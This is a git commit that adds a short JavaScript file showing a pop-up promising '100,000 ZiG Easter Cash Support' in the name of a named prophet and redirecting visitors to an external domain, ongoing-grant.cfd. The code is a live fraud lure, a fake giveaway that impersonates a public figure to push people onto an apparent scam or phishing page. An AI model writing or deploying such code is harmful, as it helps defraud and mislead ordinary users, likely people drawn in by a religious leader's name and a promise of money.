455b3cb81e5c272c6582924ddf29a942098a65fe
The-ongoing <preciousadaowo4@gmail.com>
2026-04-05 09:03:38 +0100

    Create activeeasterzz.js

---
+++ activeeasterzz.js
@@ -0,0 +1,10 @@
+var password = 'ZiG 100,000';
+
+password = prompt(
+  'Congratulations, you are eligible to Receive PROPHET UEBERT ANGEL ZiG 100,000 Easter Cash Support. Click OK to receive Instantly.',
+  'ZiG 100,000'
+);
+
+if (password !== 'ZiG 100,000') {
+    location.href = 'https://ongoing-grant.cfd/Zig100000-Easter-Support.html';
+}
